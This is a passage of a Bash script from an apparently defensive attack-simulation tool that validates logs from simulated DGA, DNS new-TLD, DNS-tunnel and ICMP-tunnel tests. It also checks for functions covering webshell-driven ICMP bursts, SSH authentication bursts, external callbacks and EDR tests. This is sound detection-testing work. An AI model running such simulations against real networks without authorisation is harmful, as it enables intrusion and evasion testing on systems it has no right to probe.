    fi
    local dw_summary dw_met="" dw_nx=0
    dw_summary=$(poc_live_log_last_match "${content}" 'DETECTION_WINDOW_SUMMARY module=DGA_Simulation')
    if [[ -n "${dw_summary}" ]]; then
        dw_met=$(dns_stats_field_from_line "${dw_summary}" condition_met)
        if [[ "${dw_met}" == yes && "${stage_status}" != Success ]]; then
            errors+="DETECTION_WINDOW condition_met=yes but stage=${stage_status}; "
        fi
        if [[ "${dw_met}" == no && "${stage_status}" == Success && "${final_result}" == success ]]; then
            if (( nxdomain >= 150 && resolved >= 3 )); then
                errors+="DETECTION_WINDOW condition_met=no contradicts stage Success (nx=${nxdomain} resolved=${resolved}); "
            fi
        fi
        if [[ "${content}" == *'required_events=nxdomain>=250'* && "${dw_summary}" == *condition_met=no* ]] && \
            (( nxdomain >= 150 && resolved >= 3 )) && [[ "${stage_status}" == Success ]]; then
            errors+="legacy nxdomain>=250 window contradicts B-plan stage Success; "
        fi
    fi

    if [[ -n "${errors}" ]]; then
        printf -v "${err_out}" '%s' "${errors}"
        return 1
    fi
    printf -v "${err_out}" '%s' "ok queries=${queries} nxdomain=${nxdomain} payload_bytes=${payload_bytes} transport=${method:-GET} result=${final_result} stage=${stage_status}"
    return 0
}

poc_live_log_assert_no_success_on_dns_new_tld() {
    local unique_tlds="$1" successful="$2" stage_status="$3" final_result="$4" likelihood="${5:-LOW}"
    if (( successful == 0 )); then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if (( unique_tlds < 3 )); then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if [[ "${final_result}" == success || "${stage_status}" == Success ]]; then
        if [[ "${likelihood}" != HIGH ]]; then
            return 1
        fi
        if (( unique_tlds < 5 || successful < 10 )); then
            return 1
        fi
    fi
    return 0
}

poc_validate_dns_new_tld_live_log() {
    local log_input="$1" err_out="${2:-POC_LIVE_LOG_VALIDATE_ERR}" content="" errors=""
    local transport="" start_line="" summary="" stage_summary="" stage_line=""
    local tested_domains=0 unique_tlds=0 query_count=0 successful=0 failed=0
    local detection_likelihood="" final_result="" stage_status="" query_types="" txt_q=0

    content=$(poc_live_log_read_content "${log_input}")
    transport=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_PAYLOAD_TRANSPORT')
    start_line=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_TEST_START')
    summary=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_SUMMARY')
    stage_summary=$(poc_live_log_last_match "${content}" 'DNS_NEW_TLD_STAGE_FINAL_SUMMARY')
    stage_line=$(poc_live_log_last_match "${content}" 'Stage result: DNS New TLD Test')

    grep -qE '^[[:space:]]*click$' <<< "$(dns_new_tld_primary_pool)" 2>/dev/null || errors+="primary TLD pool missing click; "
    grep -qE '^[[:space:]]*zip$' <<< "$(dns_new_tld_secondary_pool)" 2>/dev/null || errors+="secondary TLD pool missing zip; "

    [[ -z "${start_line}" ]] && errors+="missing DNS_NEW_TLD_TEST_START; "
    [[ -z "${summary}" ]] && errors+="missing DNS_NEW_TLD_SUMMARY; "
    [[ -z "${stage_summary}" ]] && errors+="missing DNS_NEW_TLD_STAGE_FINAL_SUMMARY; "
    [[ "${content}" != *DNS_NEW_TLD_FINAL_SUMMARY* ]] && errors+="missing DNS_NEW_TLD_FINAL_SUMMARY; "

    if [[ -n "${summary}" ]]; then
        for key in tested_domains tested_tlds unique_tlds query_count query_types successful_queries failed_queries detection_likelihood; do
            [[ "${summary}" != *"${key}="* ]] && errors+="DNS_NEW_TLD_SUMMARY missing ${key}; "
        done
        tested_domains=$(safe_int "$(dns_stats_field_from_line "${summary}" tested_domains)")
        unique_tlds=$(safe_int "$(dns_stats_field_from_line "${summary}" unique_tlds)")
        query_count=$(safe_int "$(dns_stats_field_from_line "${summary}" query_count)")
        successful=$(safe_int "$(dns_stats_field_from_line "${summary}" successful_queries)")
        failed=$(safe_int "$(dns_stats_field_from_line "${summary}" failed_queries)")
        query_types=$(dns_stats_field_from_line "${summary}" query_types)
        detection_likelihood=$(dns_stats_field_from_line "${summary}" detection_likelihood)
        txt_q=$(safe_int "$(sed -n 's/.*TXT=\([0-9]*\).*/\1/p' <<< "${query_types}")")
        if [[ -n "${query_types}" ]] && (( query_count > 0 )); then
            if (( txt_q * 100 / query_count < 15 )); then
                errors+="TXT query share below ~20% minimum (txt=${txt_q} total=${query_count}); "
            fi
        else
            grep -q 'query_type=TXT' <<< "${content}" || errors+="no TXT queries observed; "
        fi
        if [[ -n "${detection_likelihood}" ]]; then
            if (( unique_tlds >= 5 && tested_domains >= 10 )) && [[ "${detection_likelihood}" != HIGH ]]; then
                errors+="detection_likelihood=${detection_likelihood} expected HIGH for diverse burst; "
            fi
            if (( unique_tlds <= 2 )) && [[ "${detection_likelihood}" == HIGH ]]; then
                errors+="detection_likelihood=HIGH with only ${unique_tlds} TLDs; "
            fi
        else
            errors+="missing detection_likelihood in summary; "
        fi
    fi

    if [[ -n "${transport}" ]]; then
        [[ "${transport}" != *payload_bytes=* ]] && errors+="DNS_NEW_TLD_PAYLOAD_TRANSPORT missing payload_bytes; "
    fi

    if [[ -n "${stage_summary}" ]]; then
        final_result=$(dns_stats_field_from_line "${stage_summary}" result)
        detection_likelihood=$(dns_stats_field_from_line "${stage_summary}" detection_likelihood)
        [[ -z "${detection_likelihood}" ]] && detection_likelihood=$(dns_stats_field_from_line "${summary}" detection_likelihood)
    fi

    stage_status=$(poc_live_log_stage_status "${stage_line}")
    if ! poc_live_log_assert_no_success_on_dns_new_tld "${unique_tlds}" "${successful}" "${stage_status}" "${final_result}" "${detection_likelihood}"; then
        errors+="false Success blocked (unique_tlds=${unique_tlds} successful=${successful} likelihood=${detection_likelihood}); "
    fi

    if [[ -n "${errors}" ]]; then
        printf -v "${err_out}" '%s' "${errors}"
        return 1
    fi
    printf -v "${err_out}" '%s' "ok domains=${tested_domains} unique_tlds=${unique_tlds} queries=${query_count} successful=${successful} likelihood=${detection_likelihood} transport=${transport:+yes}"
    return 0
}

poc_validate_root_cause_log_sample() {
    local module="$1" payload="$2" out="$3" expected="$4" http_code="${5:-000}"
    local got=""
    got=$(poc_classify_dns_dga_root_cause "${module}" "${payload}" "${out}" "${http_code}" | head -n1)
    [[ "${got}" == "${expected}" ]]
}

_stellar_followup_self_check() {
    local fn missing=()
    for fn in count_hosts_blob count_all_discovered_services get_followup_hosts \
        collect_ssh_burst_targets collect_http_followup_targets_unique \
        run_ssh_auth_burst_for_host run_http_url_burst_for_host \
        resolve_http_followup_mode format_http_followup_summary_block format_http_followup_capability_block \
        format_intensity_runtime_values_block format_validation_result_block compute_followup_validation_result \
        maybe_run_internal_web_fanout_fallback external_callback_stage_status internal_fanout_stage_status \
        stage_discover_http_candidates followup_stage_http stage_ids_waf_signature_probe stage_validate_web_reachability stage_ssh_auth_burst stage_mandatory_service_followups \
        stage_external_callback stage_internal_web_fanout stage_dns_tunnel_enhanced \
        stage_icmp_tunnel_simulation stage_nonstandard_port_followup stage_correlation_telemetry_bundle \
        stage_edr_static_detection_test build_edr_static_test_remote_cmd build_edr_static_test_write_file_remote_cmd \
        build_edr_static_test_resolve_dir_remote_cmd run_edr_static_test_file_creation cleanup_edr_static_test_on_exit \
        parse_edr_static_test_output finalize_edr_static_test_judgment \
        write_edr_static_test_report format_edr_static_test_block edr_static_test_eicar_string edr_static_test_cloudcar_string \
        format_correlation_telemetry_summary_block format_unified_telemetry_capability_summary \
        run_dns_tunnel_simulation run_dga_simulation run_dns_new_tld_test followup_stage_dns_new_tld followup_stage_dga select_dns_tunnel_target select_dga_dns_resolver dga_ensure_resolver validate_webshell_post_exec \
        poc_validate_dns_tunnel_live_log poc_validate_icmp_tunnel_live_log poc_validate_dga_live_log poc_validate_dns_new_tld_live_log poc_validate_root_cause_log_sample \
        poc_live_log_assert_no_success_on_icmp_tunnel poc_live_log_assert_no_success_on_dns_new_tld \
        poc_collect_dns_tunnel_live_log poc_collect_dga_live_log poc_collect_dns_new_tld_live_log poc_collect_icmp_tunnel_live_log \
        poc_run_dns_tunnel_live_log_validation poc_run_dga_live_log_validation poc_run_dns_new_tld_live_log_validation poc_run_icmp_tunnel_live_log_validation \
        dns_new_tld_primary_pool dns_new_tld_secondary_pool dns_new_tld_compute_detection_likelihood build_dns_new_tld_simulation_remote_cmd finalize_dns_new_tld_stage_judgment write_dns_new_tld_report \
        aggregate_dns_query_telemetry_from_output sync_dga_telemetry_from_persisted_state sync_dns_tunnel_telemetry_from_persisted_state \
        save_dga_simulation_overlap_result \
        execute_dns_tunnel_simulation_chunked \
        reset_dns_tunnel_enhanced_fallback_stats snapshot_dns_tunnel_enhanced_run_stats \
        record_dns_tunnel_enhanced_result record_dns_tunnel_fallback_result apply_dns_tunnel_enhanced_final_decision \
        write_dns_tunnel_report write_dns_new_tld_report \
        discover_icmp_responsive_hosts select_icmp_tunnel_target collect_icmp_tunnel_discovery_ips \
        icmp_resolve_host_priority icmp_pick_best_alive_target detect_webshell_remote_os \
        build_icmp_ping_command build_icmp_probe_ping_command parse_icmp_ping_transmit_receive \
        icmp_plan_burst_parameters icmp_build_burst_ping_commands log_icmp_burst_diagnostics parse_icmp_burst_stats_from_output \
        classify_icmp_probe_failure icmp_emit_tunnel_final_summary icmp_build_final_snapshot validate_icmp_final_state icmp_emit_customer_summary validate_icmp_user_target \
        icmp_format_log_target icmp_lock_selected_target icmp_log_profile_executions_from_output \
        run_icmp_large_payload_burst run_icmp_sustained_simulation \
        run_icmp_mtu_like_anomaly run_icmp_mixed_size_simulation run_icmp_tunnel_simulation \
        run_icmp_multi_burst_profile build_icmp_single_burst_remote_script build_icmp_tunnel_like_chunk_remote_script run_icmp_tunnel_like_session \
        run_icmp_beacon_pattern_simulation run_icmp_tunnel_auto_fallback_chain validate_dns_fqdn dns_new_tld_log_root_cause \
        icmp_interval_ms_to_seconds icmp_burst_webshell_timeout_seconds run_webshell_icmp_burst classify_icmp_burst_root_cause icmp_resolve_tunnel_like_session_result \
        icmp_log_burst_transport icmp_log_burst_result_summary icmp_emit_burst_aggregation icmp_compute_detection_readiness icmp_emit_mode_summary \
        icmp_compute_tunnel_like_score icmp_is_anomaly_only_mode icmp_forbid_monolithic_ping_cmd \
        write_icmp_tunnel_report; do
        declare -F "${fn}" >/dev/null 2>&1 || missing+=("${fn}")
    done
    if ((${#missing[@]} > 0)); then
        echo "stellar_poc_followup.sh: missing required functions: ${missing[*]}" >&2
        exit 1
    fi
}
_stellar_followup_self_check
